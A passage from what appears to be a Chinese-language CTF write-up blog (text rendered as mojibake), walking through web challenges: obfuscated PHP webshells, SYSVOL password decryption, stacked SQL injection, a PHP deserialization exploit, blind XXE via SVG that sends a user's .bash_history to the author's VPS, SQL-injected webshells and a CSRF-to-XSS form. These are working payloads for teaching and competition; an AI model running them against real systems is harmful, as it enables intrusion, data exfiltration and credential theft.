<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?= $_=[] ?&gt; </span><br><span class="line">&lt;?= $_=@&quot;$_&quot; #Array ?&gt;</span><br><span class="line">&lt;?= $_=$_[(&#x27;!&#x27;==&#x27;@&#x27;)] #(&#x27;!&#x27;==&#x27;@&#x27;) results in 0 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;</span><br><span class="line">&lt;?= $_______ = &quot;_&quot;.$__ #_G ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GE ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GET ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $&#123;$_______&#125;[&quot;_&quot;]($&#123;$_______&#125;[&quot;__&quot;]) # $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª<code>$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]) ?&gt;</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ„é€ å‡½æ•°åï¼Œç¬¬äºŒä¸ªæ„é€ å‡½æ•°çš„å‚æ•°ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200507181225122.png" style="high:100%;width:100%;" />

<p>åƒè¿™æ ·å°±å¯ä»¥getshelläº†ï¼Œä½†æ˜¯æƒ³è¦è¿ä¸Šèšå‰‘è¿˜å¾—è‡ªå·±å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬è¿›å»ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://47.113.219.76/uploads/bf0688c36193e28a369a9e96517e4c2f/0d253abf34c57f57099249cd1737873b_6.phP?_=system&amp;__=echo%20&quot;&lt;?php%20eval($_POST[%27a%27])?&gt;&quot;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥æˆåŠŸè¿ä¸Šèšå‰‘äº†</p>
<img src="http://img.kawhi.xyz/image-20200507181750012.png" style="high:100%;width:100%;" />

<p>ä½†æ˜¯åœ¨èšå‰‘çš„ç»ˆç«¯è¾“å…¥<code>whoami</code>å‘ç°æƒé™ä¸å¤Ÿã€‚</p>
<p>äºæ˜¯ä¸Šä¼ <code>cmd.exe</code>å’Œ<code>ms08066</code>åœ¨å†°èé‡Œé¢è¿›è¡Œææƒã€‚</p>
<img src="http://img.kawhi.xyz/image-20200507181915887.png" style="high:100%;width:100%;" />

<p>ææƒæˆåŠŸåå‘ç°</p>
<img src="http://img.kawhi.xyz/image-20200507182333363.png" style="high:100%;width:100%;" />

<p>åœ¨<code>//192.168.0.12/Hint/</code>æ‰¾åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½ä¸‹æ¥å‘ç°æœ‰å¯†ç ã€‚</p>
<p>ç„¶åå°±æ¶‰åŠåˆ°åŸŸæ¸—é€çš„å†…å®¹ï¼Œå…·ä½“å‚è€ƒï¼š<a class="foo" href="https://3gstudent.github.io/3gstudent.github.io/åŸŸæ¸—é€-åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç /" target="_blank">ä¼ é€é—¨</a></p>
<p>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¾“å…¥<code>ipconfig /all</code>å‘ç°</p>
<img src="http://img.kawhi.xyz/image-20200507182903605.png" style="high:100%;width:100%;" />

<p>å°±æ˜¯è¯´é€šè¿‡åŸŸå†…çš„å…±äº«æ–‡ä»¶å¤¹ä¿å­˜äº†å¯†ç ï¼Œå¾®è½¯æŠŠå¯†é’¥å…¬å¼€äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç ´è§£è¿™ä¸ªå¯†é’¥å¾—åˆ°ç®¡ç†å‘˜çš„å¯†ç ã€‚</p>
<p>æ‰¾åˆ°ä¿å­˜å¯†ç çš„åœ°æ–¹</p>
<img src="http://img.kawhi.xyz/image-20200507183414569.png" style="high:100%;width:100%;" />

<p>æ‰“å¼€å‘ç°å¯†é’¥</p>
<img src="http://img.kawhi.xyz/image-20200507183526055.png" style="high:100%;width:100%;" />

<p>ç„¶åç”¨kailè‡ªå¸¦çš„gpp-decryptè§£å¯†</p>
<img src="http://img.kawhi.xyz/image-20200508150215105.png" style="high:100%;width:100%;" />

<p>æ‰“å¼€ä¹‹å‰å¾—åˆ°çš„å‹ç¼©åŒ…è¾“å…¥å¯†ç å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="life"><a href="#life" class="headerlink" title="life"></a><strong>life</strong></h4><p>é¢˜ç›®hint:No Game No Life!</p>
<p>è¿™é“é¢˜ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç”¨<code>foremost</code>åˆ†ç¦»ä¹‹åå¾—åˆ°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…å’Œä¸€å¼ ç±»å‹äºŒç»´ç çš„å›¾ç‰‡ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200508175230822.png" style="high:50%;width:50%;" />

<p>è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹ç”Ÿå‘½æ¸¸æˆï¼š<a class="foo" href="https://blog.csdn.net/u011439689/article/details/17226237" target="_blank">ä¼ é€é—¨</a></p>
<p>ç„¶åæœ‰ä¸ªç½‘ç«™å¯ä»¥æ¨¡æ‹Ÿç”Ÿå‘½æ¸¸æˆï¼š<a class="foo" href="https://funnyjs.com/jspages/game-of-life.html" target="_blank">ä¼ é€é—¨</a></p>
<img src="http://img.kawhi.xyz/image-20200508175630302.png" style="high:80%;width:80%;" />

<p>è¿™é‡Œéœ€è¦è‡ªå·±ä¸€ä¸ªç‚¹ä¸€ä¸ªç‚¹ç”»ä¸Šå»ï¼Œç„¶åç‚¹å‡»å•æ­¥ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200508175832975.png" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æäºŒç»´ç å°±å¯ä»¥å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚</p>
<p>è§£å¼€å‹ç¼©åŒ…ä¹‹åå‘ç°txtæ–‡ä»¶æœ‰ä¸€ä¸²æ•°å­—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥åˆ°<code>cyberchef</code>è§£å¯†ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>DozerCTF</title>
    <url>/2020/06/17/DozerCTF/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¹²å•¥å•¥ä¸è¡Œï¼Œèµ›åread writeupç¬¬ä¸€å</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>è¿™é“é¢˜æ˜¯åŸé¢˜</p>
<p>é¦–å…ˆæç¤ºurläºŒæ¬¡ç¼–ç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%25%32%37</span><br></pre></td></tr></table></figure>

<p>å‘ç°æŠ¥é”™ï¼Œç„¶åå°è¯•selectå’Œunionéƒ½è¢«è¿‡æ»¤äº†ï¼Œå°è¯•å †å æ³¨å…¥ã€‚</p>
<p>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ‰€æœ‰è¡¨:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢wordsè¡¨ä¸­æ‰€æœ‰åˆ—:(æ³¨æ„è¦åŠ ä¸Šåå¼•å·)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `uziuzi`;#</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ç§payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;prEpare%20stmt%20from%20@sql;EXECUTE%20stmt;%23</span><br></pre></td></tr></table></figure>

<p>é¢„å¤„ç†æŸ¥è¯¢æ•°æ®åº“å†…å®¹ï¼Œè¿™é‡Œç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²æ²¡æ³•æ‰§è¡Œï¼Œæ‰€ä»¥æŠŠå­—ç¬¦ä¸²è½¬16è¿›åˆ¶å†æ‰§ è¡Œã€‚</p>
<p>ç¬¬äºŒç§payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;handler%20`uziuzi`%20open;handler%20`uziuzi`%20read%20first;%23</span><br></pre></td></tr></table></figure>

<h2 id="ç™½ç»™çš„ååºåˆ—åŒ–"><a href="#ç™½ç»™çš„ååºåˆ—åŒ–" class="headerlink" title="ç™½ç»™çš„ååºåˆ—åŒ–"></a><strong>ç™½ç»™çš„ååºåˆ—åŒ–</strong></h2><p>é¢˜ç›®æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">&quot;cat $path&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        foreach ($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">    $path = @$_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">        function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = new home(<span class="string">&quot;mysys&quot;</span>,[<span class="string">&#x27;flag.php&#x27;</span>]);</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å…³äº<code>call_user_func_array</code>è¯¦æƒ…å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" href="https://www.php.net/manual/zh/function.call-user-func-array.php" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹payloadï¼Œå› ä¸ºæœåŠ¡å™¨çš„phpç‰ˆæœ¬æ˜¯ php5.59ï¼Œæ²¡æ³•ç›´æ¥æ”¹æˆpublicç»•è¿‡ï¼ˆphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼‰ï¼Œæ‰€ä»¥éœ€è¦å§sæ”¹æˆSï¼ˆè¿™æ ·èƒ½è¯†åˆ«16è¿›åˆ¶çš„<code>%00</code>ï¼‰,æŠŠ<code>&lt;0x00&gt;</code>æ›¿æ¢ä¸º<code>\00</code>ã€‚</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30600/?path=O:4:%22home%22:2:&#123;S:12:%22\00home\00method%22;S:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:&#123;i:0;S:8:%22flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h2><p>é¢˜ç›®çš„hint</p>
<ul>
<li>ç”¨æˆ·r1ckçš„æ“ä½œè®°å½•åœ¨å“ªå„¿æ¥ç€</li>
<li>å¦‚æœä½ å‘ç°äº†sqlæ³¨å…¥ï¼Œç›´æ¥getshellå§ï¼Œflagåœ¨/appç›®å½•é‡Œ</li>
</ul>
<p>æ‰“å¼€ç½‘é¡µï¼Œæœ‰ä¸€ä¸ªæ¡†è¦æ±‚è¾“å…¥URLï¼Œç„¶åæ£€æŸ¥URLæŒ‡å‘çš„fileæ˜¯ä¸æ˜¯svgå›¾ç‰‡</p>
<p>é¦–å…ˆSVGæ˜¯ä»€ä¹ˆå‘¢ï¼ŒSVGæ˜¯åŸºäºXMLçš„çŸ¢é‡å›¾ï¼Œå¯ä»¥æ”¯æŒEntityï¼ˆå®ä½“ï¼‰åŠŸèƒ½ï¼Œè¿™é‡Œæœªä¸¥æ ¼é™åˆ¶æ ¼å¼ï¼Œå› æ­¤é€ æˆblind xxeï¼Œssrfæ‰“å†…ç½‘æœåŠ¡ã€‚</p>
<p>å…ˆå†™ä¸€ä¸ªç®€å•çš„SVGå›¾ç‰‡æºç æ”¾åœ¨vpsä¸Š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab <span class="string">&quot;HELLO&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;	</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>æäº¤SVGå›¾ç‰‡æºç åœ°å€å‘ç°å®ä½“æˆåŠŸæ˜¾ç¤º</p>
<p>ç„¶åå°è¯•è¯»å–æ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>é¡µé¢è™½ç„¶æ­£å¸¸è¿”å›ä¿¡æ¯ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ç›´æ¥è¯»åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p>
<p>æ— å›æ˜¾ï¼Œåˆæ˜¯XXEï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹XXEç›²æ‰“ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åŠ è½½å¤–éƒ¨ä¸€ä¸ªdtdæ–‡ä»¶ï¼Œç„¶åæŠŠè¯»å–ç»“æœä»¥HTTPè¯·æ±‚çš„æ–¹å¼å‘é€åˆ°è‡ªå·±çš„VPSã€‚</p>
<p>æ„é€ 1.svg</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;http://39.105.158.221:1234/1.dtd&quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ 1.dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://39.105.158.221:1234/?%file;&#x27;&gt;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ï¼Œå› ä¸ºxmlè§£æå™¨æ”¯æŒä½¿ç”¨php://filterè¿›è¡Œç¼–ç ã€‚</p>
<p>è¿™é‡Œéœ€è¦vpsä¸Šéšä¾¿åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸Šå¼€å¯httpæœåŠ¡ï¼Œç„¶åæŠŠ1.svgåˆ1.dtdä¸¢è¿›å»å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘é¡µæäº¤1.svgçš„é“¾æ¥å³å¯æˆåŠŸè¯»å–åˆ°.bash_history</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /app</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨SSRFæ‰“å†…ç½‘</p>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/app/index.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°sqlæ³¨å…¥ï¼Œå†™å…¥urlç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23</span><br></pre></td></tr></table></figure>

<p>è¯»å–æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=ls&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>è¯»å–flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h2><p>å¼€å¯ncç›‘å¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨contentå¤„è¾“å…¥ncç›‘å¬çš„é“¾æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„codeåŸæ¥çš„éªŒè¯ç ï¼Œæ¯”å¦‚ï¼šsubstr(md5(?), 0, 6) = b1a0fdï¼Œè¿™é‡Œçš„éªŒè¯ç å°±æ˜¯ï¼Ÿã€‚</p>
<p>éœ€è¦ä¸€ä¸ªè„šæœ¬æ¥çˆ†ç ´ï¼Œè¿™é‡Œè´´ä¸€ä¸‹è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®</span></span><br><span class="line"><span class="comment"># ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># è®¡ç®—MD5å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2ff56c&#x27;</span>   <span class="comment">#å·²çŸ¥çš„md5æˆªæ–­å€¼</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®</span></span><br><span class="line">md5length = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])   <span class="comment"># å¼€å§‹ä½ç½®</span></span><br><span class="line">    end = int(key[<span class="number">1</span>])    <span class="comment"># ç»“æŸä½ç½®</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="comment">#print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == keymd5:            <span class="comment"># æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># æ‰“å°</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">list=[]  <span class="comment"># å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):   <span class="comment"># å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool(<span class="number">100</span>)    <span class="comment"># å¤šçº¿ç¨‹ä»»åŠ¡</span></span><br><span class="line">pool.map(findmd5, list) <span class="comment"># å‡½æ•° ä¸å‚æ•°åˆ—è¡¨</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°Referer: <a href="http://127.0.0.1//admin_shark.php">http://127.0.0.1//admin_shark.php</a></p>
<p>è¿™æ˜¯ç®¡ç†å‘˜çš„åå°åœ°å€ï¼Œè®¿é—®æç¤ºç™»é™†åœ°ç‚¹é”™è¯¯ã€‚</p>
<p><strong>æ€è·¯</strong></p>
<ul>
<li>æ‰§è¡Œsqlè¯­å¥å¤„åˆ©ç”¨hexå¯ä»¥è¿›è¡Œxss</li>
<li>contactåŠŸèƒ½å¤„å¯ä»¥csrf</li>
<li>é‚£æˆ‘ä»¬å¯ä»¥å°†csrfçš„payloadæ”¾åœ¨vpsä¸Šï¼Œåœ¨contactå¤„æäº¤vpsä¸Špayloadçš„åœ°å€æ¥è§¦å‘xssè¯»å–åå°æºç ã€‚</li>
</ul>
<p>ç”¨äºCSRFçš„è¡¨å•</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;exp&quot;</span> action=<span class="string">&quot;http://127.0.0.1/sql.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;sql&quot;</span> value=<span class="string">&quot;select 0x3c734372497074207372433d2f2f78732e73622f56346f383e3c2f7343526970543e&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">document.exp.submit()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯æ”¾åœ¨XSSå¹³å°çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function createXmlHttp() &#123;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = new XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var MSXML = new Array(<span class="string">&#x27;MSXML2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>, <span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (var n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                xmlHttp = new ActiveXObject(MSXML[n]);</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            